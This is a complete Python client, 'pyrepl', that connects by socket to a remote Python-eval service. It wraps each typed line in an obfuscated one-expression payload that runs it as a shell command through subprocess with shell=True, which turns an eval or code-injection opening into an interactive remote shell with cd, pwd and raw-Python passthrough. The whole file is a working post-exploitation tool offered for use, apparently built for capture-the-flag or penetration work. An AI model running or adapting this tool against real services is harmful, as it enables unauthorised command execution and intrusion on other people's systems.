#!/usr/bin/env python3
# pyrepl: shell-like client for Python-eval services
# - Persistent remote cwd: cd / cd .. / cd - / pwd
# - Shell-like stdout+stderr (no Python tracebacks)
# - Dynamic prompt shows remote cwd
# - Arrow keys + history via readline (persistent at ~/.pyrepl_history)
# - ":raw <python>" passthrough, "exit/quit" to leave

import socket, sys, select, argparse, os, atexit
from typing import Optional

# readline (arrow keys + persistent history)
try:
    import readline
    HISTFILE = os.path.expanduser("~/.pyrepl_history")
    try:
        import rlcompleter
    except Exception:
        pass
    try:
        os.makedirs(os.path.dirname(HISTFILE), exist_ok=True)
    except Exception:
        pass
    try:
        import pathlib
        pathlib.Path(HISTFILE).touch(exist_ok=True)
    except Exception:
        pass
    try:
        import readline as _rl
        _rl.read_history_file(HISTFILE)
        atexit.register(_rl.write_history_file, HISTFILE)
    except Exception:
        pass
except Exception:
    # No readline on platform; arrow keys won't work. Still functional.
    pass

BANNER = "pyrepl — type 'exit' to quit, ':raw <python>' to send raw Python.\n"
PREV_VAR = "__pyrepl_prevdir"  # remote global to track `cd -`

# Payload builders (single-expression strings)
def _write(expr: str) -> str:
    return "__import__('sys').stdout.write(" + expr + ")"

def build_expr_pwd() -> str:
    return _write("__import__('os').getcwd()+\"\\n\"") + "\n"

def build_expr_shell(cmd: str) -> str:
    return (
        "(lambda __c: (lambda __r: "
        + _write("((__r.stdout or '') + (__r.stderr or ''))")
        + ")("
        "__import__('subprocess').run(__c, shell=True, capture_output=True, text=True, "
        "cwd=__import__('os').getcwd())"
        "))(" + repr(cmd) + ")\n"
    )

def build_expr_cd(arg: Optional[str]) -> str:
    osimp   = "__import__('os')"
    pathimp = "__import__('os').path"
    getcwd  = f"{osimp}.getcwd()"
    gbls    = "__import__('builtins').globals()"

    if arg is None:
        target = f"{pathimp}.expanduser('~')"
        msg = "'Changed directory to: '+" + getcwd + "+'\\n'"
        return "(" + osimp + ".chdir(" + target + ")," + _write(msg) + ")\n"

    arg = arg.strip()

    if arg == "-":
        msg = "'Changed directory to: '+" + getcwd + "+'\\n'"
        return (
            "(lambda __g: ("
            + _write("'No previous directory\\n'") +
            " if " + repr(PREV_VAR) + " not in __g else "
            "(lambda __cur,__prev: (" + osimp + ".chdir(__prev), "
            "__g.update({" + repr(PREV_VAR) + ": __cur}), "
            + _write(msg) +
            "))(" + getcwd + ", __g[" + repr(PREV_VAR) + "])"
            "))(" + gbls + ")\n"
        )

    if arg == "..":
        parent = f"{pathimp}.dirname({getcwd})"
        msg = "'Changed directory to: '+" + getcwd + "+'\\n'"
        return "(lambda __p: (" + osimp + ".chdir(__p), " + _write(msg) + "))(" + parent + ")\n"

    target = f"{pathimp}.expanduser({repr(arg)})"
    msg = "'Changed directory to: '+" + getcwd + "+'\\n'"
    return (
        "(lambda __g,__cur: ("
        + osimp + ".chdir(" + target + "), "
        "__g.update({" + repr(PREV_VAR) + ": __cur}), "
        + _write(msg) +
        "))(" + gbls + "," + getcwd + ")\n"
    )

def build_payload(user_line: str) -> Optional[str]:
    line = user_line.rstrip("\n")

    if line in ("exit", "quit"):
        return None

    if line.startswith(":raw "):
        raw = line[5:]
        return raw + ("\n" if not raw.endswith("\n") else "")
    if line == ":raw":
        return "\n"

    if line == "pwd":
        return build_expr_pwd()
    if line.startswith("cd"):
        parts = line.split(maxsplit=1)
        return build_expr_cd(None if len(parts) == 1 else parts[1])

    return build_expr_shell(line)

# Transport helpers

def recv_until_idle(sock: socket.socket, timeout: float) -> bytes:
    buf = bytearray()
    while True:
        r, _, _ = select.select([sock], [], [], timeout)
        if not r:
            break
        try:
            chunk = sock.recv(4096)
        except BlockingIOError:
            break
        if not chunk:
            break
        buf.extend(chunk)
    return bytes(buf)

# Main CLI

def main():
    ap = argparse.ArgumentParser(description="Shell wrapper for Python-eval services (pyrepl)")
    ap.add_argument("host")
    ap.add_argument("port", type=int)
    ap.add_argument("-T", "--timeout", type=float, default=0.35, help="idle read timeout after each command")
    args = ap.parse_args()

    s = socket.socket()
    s.connect((args.host, args.port))
    s.setblocking(False)

    # Reads initial banner, if there is any...
    try:
        data = s.recv(4096)
        if data:
            sys.stdout.write(data.decode(errors="ignore"))
    except BlockingIOError:
        pass

    sys.stdout.write(BANNER)
    sys.stdout.flush()

    try:
        while True:
            # Build dynamic prompt from remote cwd
            try:
                s.sendall(build_expr_pwd().encode())
                cwd = recv_until_idle(s, args.timeout).decode(errors="ignore").strip()
            except Exception:
                cwd = ""
            prompt = (cwd + "$ ") if cwd else "> "

            try:
                line = input(prompt)
            except KeyboardInterrupt:
                sys.stdout.write("\n")
                break
            except EOFError:
                break

            payload = build_payload(line)
            if payload is None:
                break

            s.sendall(payload.encode())
            out = recv_until_idle(s, args.timeout)
            if out:
                try:
                    sys.stdout.write(out.decode(errors="ignore"))
                except Exception:
                    sys.stdout.buffer.write(out)
    finally:
        try:
            s.shutdown(socket.SHUT_RDWR)
        except Exception:
            pass
        s.close()

if __name__ == "__main__":
    main()
